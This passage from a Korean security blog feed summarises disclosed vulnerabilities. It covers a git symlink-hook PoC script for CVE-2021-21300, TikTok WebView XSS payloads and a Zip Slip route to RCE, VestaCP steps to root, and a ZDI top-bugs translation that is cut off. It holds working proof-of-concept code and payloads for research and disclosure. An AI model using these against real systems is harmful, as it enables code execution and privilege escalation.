PoC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span>  git init delayed-checkout &amp;&amp;  (  <span class="hljs-built_in">cd</span> delayed-checkout &amp;&amp;  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;A/post-checkout filter=lfs diff=lfs merge=lfs&quot;</span> \\  &gt;.gitattributes &amp;&amp;  mkdir A &amp;&amp;  <span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;#!/bin/sh\\n\\necho PWNED &gt;&amp;2\\n&apos;</span> &gt;A/post-checkout &amp;&amp;  chmod +x A/post-checkout &amp;&amp;  &gt;A/a &amp;&amp;  &gt;A/b &amp;&amp;  git add -A &amp;&amp;  rm -rf A &amp;&amp;  ln -s .git/hooks a &amp;&amp;  git add a &amp;&amp;  git commit -m initial  )</code></pre><ol><li><p>&#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xC778; <code>A/post-checkout</code>&#xC774; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; &#xCD94;&#xAC00;&#xB41C; &#xD6C4; &#xC81C;&#xAC70;&#xB418;&#xBA74; Git &#xCE90;&#xC2DC;&#xC5D0; &#xB0A8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>./git/hooks</code>&#xC758; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; <code>a</code>&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>git hooks - &#xD2B9;&#xC815; &#xC774;&#xBCA4;&#xD2B8;&#xC5D0; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;</li></ul></li><li><p>&#xD0C0;&#xAE43;&#xC774; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC774;&#xB77C;&#xBA74; &#xD574;&#xB2F9; &#xC800;&#xC7A5;&#xC18C;&#xB97C; clone &#xD560; &#xB54C; <code>a</code>&#xC640; <code>A</code>&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xC9C0; &#xBABB;&#xD574; <code>./git/hooks/post-checkout</code> &#xD30C;&#xC77C;&#xC774; Git &#xCE90;&#xC2DC;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC545;&#xC131;&#xD30C;&#xC77C;&#xC778; <code>A/post-checkout</code>&#xB85C; &#xB300;&#xCCB4;&#xB429;&#xB2C8;&#xB2E4;.</p></li><li><p>git hooks&#xC5D0; &#xC758;&#xD574; <code>post-checkout</code>&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xACE0; <code>post-checkout</code>&#xC5D0; &#xC791;&#xC131;&#xB41C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p></li></ol><p><img src="/2021/03/23/l0ch/2021-03-23/image.png" alt></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>POC - <a href="https://github.com/Maskhe/CVE-2021-21300">https://github.com/Maskhe/CVE-2021-21300</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>git</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 안드로이드 틱톡 앱에서 발견된 5가지 취약점</title>
    <link href="/2021/03/22/idioth/2021-03-22/"/>
    <url>/2021/03/22/idioth/2021-03-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105">TikTok for Android 1-Click RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>TikTok for Android Application</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; &#xD2F1;&#xD1A1; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; 5&#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC1C;&#xACAC;&#xB41C; 5&#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810; &#xC911; XSS, Zip Slip, RCE &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xC0C1;&#xC138; &#xB0B4;&#xC6A9;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>Universal XSS on TikTok WebView</strong></p><p>&#xD2F1;&#xD1A1;&#xC740; &#xBC1B;&#xC740; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0;&#xC11C; deep-link&#xB85C; &#xD638;&#xCD9C;&#xB420; &#xC218; &#xC788;&#xB294; &#xD2B9;&#xC815; WebView&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. WebView&#xB294; &#xC131;&#xB2A5;&#xC744; &#xD5A5;&#xC0C1;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC624;&#xB294; &#xB300;&#xC2E0; &#xB0B4;&#xBD80; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC624;&#xB294; falcon link&#xB77C;&#xB294; &#xAC83;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC131;&#xB2A5;&#xC744; &#xCE21;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD398;&#xC774;&#xC9C0;&#xAC00; &#xB85C;&#xB529;&#xB418;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs kotlin"><span class="hljs-keyword">this</span>.a.evaluateJavascript(<span class="hljs-string">&quot;JSON.stringify(window.performance.getEntriesByName(\&apos;&quot;</span> + <span class="hljs-keyword">this</span>.webviewURL + <span class="hljs-string">&quot;\&apos;))&quot;</span>, v2);</code></pre><p>&#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; query string segment&#xB85C; &#xC778;&#xCF54;&#xB529; &#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>getEntriesByName</code>&#xC758; URL &#xB4A4;&#xC5D0; <code>#</code>&#xC744; &#xCD94;&#xAC00;&#xD55C; &#xD6C4; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xBA74; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xB3D9;&#xC791;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>stringify(window.performance.get<span class="hljs-constructor">EntriesByName(&apos;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">m</span>.<span class="hljs-params">tiktok</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">falcon</span><span class="hljs-operator">/</span>#&apos;)</span>,alert(<span class="hljs-number">1</span>));<span class="hljs-comment">//&apos;))</span></code></pre><p><strong>Another XSS on AddWikiActivity</strong></p><p><code>AddWikiActivity</code>&#xB294; &#xC545;&#xC131; URL&#xC774; &#xC5F4;&#xB9AC;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; URL &#xAC80;&#xC0AC;&#xB97C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>http</code>&#xB098; <code>https</code> scheme&#xB9CC; &#xD655;&#xC778;&#xC744; &#xD558;&#xBBC0;&#xB85C; &#xB2E4;&#xB978; scheme&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xAC80;&#xC0AC;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>javascript</code> scheme&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xBA74; XSS&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs perl">window.ToutiaoJSBridge.invokeMethod(JSON.stringify({    <span class="hljs-string">&quot;__callback_id&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,    <span class="hljs-string">&quot;func&quot;</span>: <span class="hljs-string">&quot;openSchema&quot;</span>,    <span class="hljs-string">&quot;__msg_type&quot;</span>: <span class="hljs-string">&quot;callback&quot;</span>,    <span class="hljs-string">&quot;params&quot;</span>: {        <span class="hljs-string">&quot;schema&quot;</span>: <span class="hljs-string">&quot;aweme://wiki?url=javascript://m.tiktok.com/%250adocument.write(%22%3Ch1%3EPoC%3C%2Fh1%3E%22)&amp;disable_app_link=false&quot;</span>    },    <span class="hljs-string">&quot;JSSDK&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;host&quot;</span>,    <span class="hljs-string">&quot;__iframe_url&quot;</span>: <span class="hljs-string">&quot;http://iframe.attacker.com/&quot;</span>}));</code></pre><p><strong>Remote Code Execution</strong></p><p>RCE&#xB97C; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; zip file&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0;, path traversal&#xC744; &#xD1B5;&#xD574; <code>/data/data/com.zhiliaoapp.musically/app_lib/df_rn_kit/df_rn_kit_a3e37c20900a22bc8836a51678e458f7/arm64-v8a/libjsc.so</code>&#xC744; overwrite &#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574;&#xC11C; Zip Slip &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>TmaTestActivity</code>&#xB294; &#xC778;&#xD130;&#xB137;&#xC5D0;&#xC11C; zip &#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; SDK&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>DownloadBaseBundleHandler</code>&#xC5D0;&#xC11C; <code>sdkUpdateVersion</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xD655;&#xC778;&#xD558;&#xC5EC; &#xBC84;&#xC804;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294;&#xB370;, &#xAC12;&#xC744; <code>99.99.99</code>&#xB85C; &#xC124;&#xC815;&#xD558;&#xBA74; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xACFC;&#xD558;&#xC5EC; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB97C; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xD6C4; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xC5D0; &#xC788;&#xB294; <code>{md5sum_of_file}</code>&#xACFC; &#xD30C;&#xC77C;&#xC758; md5sum &#xAC12;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xBBC0;&#xB85C; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xC740; <code>anything_{md5sum_of_file}.zip</code>&#xC774; &#xB418;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xD55C; &#xD30C;&#xC77C;&#xC740; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC555;&#xCD95;&#xC774; &#xD574;&#xC81C;&#xB418;&#xC5B4; native-library&#xB97C; &#xC545;&#xC131; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB85C; overwrite &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; overwirte &#xD55C; &#xD6C4; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC7AC;&#xC2E4;&#xD589;&#xD558;&#xAC70;&#xB098; <code>com.tt.miniapphost.placeholder.MiniappTabActivity0</code>&#xB97C; &#xD1B5;&#xD574; Remote Code Execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC740; XSS &#xCF54;&#xB4DC; &#xC218;&#xC815;, <code>TmaTestActivity</code> &#xC0AD;&#xC81C;, <code>intent</code> scheme &#xC81C;&#xD55C; &#xAD6C;&#xD604;&#xC73C;&#xB85C; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>tiktok</tag>
      
      <tag>zip-slip</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] VestaCP Local Privilege Escalation 취약점</title>
    <link href="/2021/03/21/insu/2021-03-21/"/>
    <url>/2021/03/21/insu/2021-03-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-vestacp-lpe-vulnerabilities/">SSD Advisory &#x2013; VestaCP LPE Vulnerabilities</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>VestCP 0.9.8-24 &#xC774;&#xD558; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC624;&#xD508;&#xC18C;&#xC2A4; &#xC6F9; &#xD638;&#xC2A4;&#xD305; &#xC81C;&#xC5B4;&#xD310;&#xC778; VESTA Control Panel(VestaCP)&#xC5D0;&#xC11C; user&#xAC00; admin&#xC73C;&#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>/add/web/index.php</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; v-add-web-domain &#xC258; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB098; &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0;&#xC5D0; &#xAC80;&#xC0AC; &#xC5C6;&#xC774; &#xB2E4;&#xC74C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs basic"><span class="hljs-symbol">88 </span>: # Changing file owner &amp; permission<span class="hljs-symbol">89 </span>: chown -R $user:$user $HOMEDIR/$user/web/$domain<span class="hljs-symbol">90 </span>: chown root:$user /var/<span class="hljs-keyword">log</span>/$WEB_SYSTEM/domains/$domain.* $conf<span class="hljs-symbol">91 </span>: chmod <span class="hljs-number">640</span> /var/<span class="hljs-keyword">log</span>/$WEB_SYSTEM/domains/$domain.*<span class="hljs-symbol">92 </span>: chmod <span class="hljs-number">751</span> $HOMEDIR/$user/web/$domain $HOMEDIR/$user/web/$domain/*<span class="hljs-symbol">93 </span>: chmod <span class="hljs-number">551</span> $HOMEDIR/$user/web/$domain/stats $HOMEDIR/$user/web/$domain/logs<span class="hljs-symbol">94 </span>: chmod <span class="hljs-number">644</span> $HOMEDIR/$user/web/$domain/public_*html/*.*</code></pre><p>&#xC704;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xB4E4;&#xC740; <code>$domain</code> &#xD3F4;&#xB354;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xBBC0;&#xB85C; 94 &#xC904;&#xC758; &#xBA85;&#xB839;&#xC744; &#xD1B5;&#xD574; &#xC77D;&#xACE0; &#xC2F6;&#xC740; &#xD30C;&#xC77C;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xACE0;, 92 &#xC904;&#xC758; &#xBA85;&#xB839;&#xC744; &#xD1B5;&#xD574; &#xD3F4;&#xB354;&#xC758; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xB610;&#xD55C; VestaCP&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xAC70;&#xB098; &#xB9AC;&#xC2A4;&#xD2B8; &#xD558;&#xB294; &#xB4F1;&#xC758; web-app&#xC758; &#xBAA8;&#xB4E0; &#xAE30;&#xB2A5;&#xC744; bash &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0; &#xC758;&#xC874;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; bash &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB4E4;&#xC740; root &#xC18C;&#xC720;&#xC774;&#xBA70; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC;, <code>sudo -l</code>&#xC744; &#xD1B5;&#xD574; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC785;&#xB825; &#xC5C6;&#xC774; admin&#xC774; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC774;&#xB7EC;&#xD55C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; root&#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>v-list-user &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0; <code>source $VESTA/func/main.sh</code>&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xBBC0;&#xB85C; <code>/tmp/func</code> &#xD3F4;&#xB354;&#xC5D0; <code>/bin/bash</code> &#xC258; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC785;&#xB825; &#xC5C6;&#xC774; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xD658;&#xACBD; &#xBCC0;&#xC218; <code>$VESTA</code>&#xB97C; <code>/tmp</code>&#xB85C; overwrite &#xD569;&#xB2C8;&#xB2E4;.</li><li>v-list-user&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;, root &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>insu</tag>
      
      <tag>vestacp</tag>
      
      <tag>lpe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] ZDI에서 선정한 2020년 제일 중요한 취약점 Top 5</title>
    <link href="/2021/03/21/j0ker/zdi_2020_vuln/"/>
    <url>/2021/03/21/j0ker/zdi_2020_vuln/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. &#xBBFF;&#xAC70; &#xC870; &#xC528; &#xC9D1;&#xC548; 28&#xB300;&#xC190; Joker(&#xC870;-&#xCEE4;)&#xC785;&#xB2C8;&#xB2E4;. &#xCCAB; &#xAE00;&#xC740; &#xBD80;&#xB2F4;&#xC2A4;&#xB7FD;&#xC9C0; &#xC54A;&#xAC8C; &#xBC88;&#xC5ED;&#xAE00;&#xB85C; &#xC900;&#xBE44;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC55E;&#xC73C;&#xB85C; &#xC7AC;&#xBBF8;&#xC788;&#xB294; &#xC5F0;&#xAD6C; &#xB9CE;&#xC774; &#xD574;&#xC11C; &#xC88B;&#xC740; &#xAE00; &#xC62C;&#xB824;&#xB4DC;&#xB9AC;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; (<strong> </strong>) &#xCC38;&#xACE0;&#xB85C; &#xBC88;&#xC5ED;&#xC5D0;&#xB294; &#xC758;&#xC5ED;&#xC774; &#xB9CE;&#xC744; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xAC78;&#xB85C; &#xD0DC;&#xD074; &#x3134;&#x3134;</p><p><img src="/2021/03/21/j0ker/zdi_2020_vuln/Untitled.png" alt></p><p>&#xB450;&#xB450;&#xB4F1;&#xC7A5;</p><hr><p>&#xC5F0;&#xB9D0;&#xC774; &#xB418;&#xBA74;&#xC11C;, &#xC6B0;&#xB9AC;&#xB294; 2020&#xB144;&#xC5D0; &#xBC1B;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC744; &#xB4A4;&#xB3CC;&#xC544; &#xBCF4;&#xBA74;&#xC11C; &#xCD5C;&#xACE0;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC744; &#xBF51;&#xC544;&#xBCF4;&#xBA74; &#xC5B4;&#xB5A8;&#xAE4C;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xB2E4;. &#xC0DD;&#xAC01;&#xC740; &#xC774;&#xB807;&#xAC8C; &#xD588;&#xC9C0;&#xB9CC;, &#xC791;&#xB144;&#xC5D0;(&#xAE00;&#xC740; &#xC791;&#xB144;&#xC5D0; &#xB098;&#xC628; &#xAC70;&#xB77C; &#xC62C;&#xD574;&#xB77C;&#xACE0; &#xB418;&#xC5B4; &#xC788;&#xC9C0;&#xB9CC; &#xC77D;&#xAE30; &#xD3B8;&#xD558;&#xB3C4;&#xB85D; &#xD604;&#xC7AC; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; &#xC791;&#xB144;&#xC774;&#xB77C; &#xD558;&#xACA0;&#xB2E4;) &#xC6B0;&#xB9AC;&#xAC00; &#xACF5;&#xAC1C;&#xD55C; Advisor&#xB4E4;&#xC758; &#xC218;&#xAC00; &#xAC70;&#xC758; &#xCD5C;&#xACE0;&#xC5D0; &#xB2E4;&#xB2E4;&#xB790;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; 1400&#xAC1C;&#xAC00; &#xB118;&#xB294; &#xBC84;&#xADF8;&#xB4E4; &#xC911;&#xC5D0;&#xC11C; &#xCD5C;&#xACE0;&#xC758; &#xBC84;&#xADF8; 5&#xAC1C;&#xB97C; &#xACE8;&#xB77C;&#xB0B4;&#xB294; &#xAC83;&#xC740; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xC5B4;&#xB824;&#xC6B4; &#xC77C;&#xC774;&#xC5C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xB9C8;&#xCE68;&#xB0B4; &#xC6B0;&#xB9AC;&#xB294; 2020&#xB144;&#xC5D0; &#xC81C;&#xCD9C;&#xB41C; &#xBC84;&#xADF8;&#xB4E4; &#xC911; &#xCD5C;&#xACE0;&#xC758; &#xBC84;&#xADF8; Top 5&#xB97C; &#xAF3D;&#xC544;&#xBCF4;&#xC558;&#xB2E4;! &#xC9DC;&#xC794;!</p><h1 id="CVE-2020-0688-ZDI-20-258"><a href="#CVE-2020-0688-ZDI-20-258" class="headerlink" title="CVE-2020-0688/ZDI-20-258"></a>CVE-2020-0688/ZDI-20-258</h1><p><strong>Microsoft Exchange Server Exchange Control Panel Fixed Cryptographic Key Remote Code Execution Vulnerability</strong></p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Microsoft Exchange Server&#xC758; Exchange Admin Center &#xC6F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xB9E4;&#xC6B0; &#xD06C;&#xB9AC;&#xD2F0;&#xCEEC;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, &#xC778;&#xC99D;&#xB41C; Exchange &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xC11C;&#xBC84;&#xC758; SYSTEM &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xB2E4;. &#xC774; &#xC6F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB294; &#x201C;Admin&#x201D; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB77C;&#xACE0; &#xBD88;&#xB9AC;&#xAE30;&#xB294; &#xD558;&#xC9C0;&#xB9CC;, Exchange &#xC11C;&#xBC84;&#xC758; mailbox&#xC5D0; &#xB300;&#xD55C; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xC720;&#xC800;&#xB77C;&#xBA74; &#xBAA8;&#xB450; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBA70; Outlook Web Access&#xC640; &#xAC19;&#xC774; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xB178;&#xCD9C;&#xB418;&#xC5B4; &#xC788;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Exchange Admin Center ASP.NET&#xC5D0; &#xC124;&#xCE58;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xC554;&#xD638;&#xD654; &#xD0A4;(&#x201C;machine keys&#x201D;)&#xC640; &#xC5F0;&#xAD00;&#xC774; &#xC788;&#xB2E4;. Exchange&#xC5D0;&#xC11C;&#xB294; &#xC124;&#xCE58;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xC774; &#xD0A4;&#xB4E4;&#xC744; &#xB79C;&#xB364;&#xD558;&#xAC8C; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xD574;&#xB2F9; &#xD0A4;&#xAC00; &#xC720;&#xB2C8;&#xD06C;&#xD558;&#xACE0; &#xC548;&#xC804;&#xD558;&#xB3C4;&#xB85D; &#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C;&#xB85C;&#xB294; &#xC774; &#xD0A4;&#xB4E4;&#xC744; install media&#xC5D0;&#xC11C; &#xBC14;&#xB85C; &#xBCF5;&#xC0AC;&#xD574;&#xC624;&#xB294;&#xB370;, &#xC774;&#xB85C; &#xC778;&#xD574; &#xD574;&#xCEE4;&#xAC00; &#xB2E4;&#xB978; &#xC81C;&#xD488;&#xC758; installation&#xC744; &#xCC38;&#xACE0;&#xD558;&#xC5EC; &#xC774; &#xD0A4;&#xB4E4;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xC774; &#xD0A4;&#xB4E4;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC11C;&#xBC84;&#xC5D0; &#xC870;&#xC791;&#xB41C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B4;&#xACE0;, 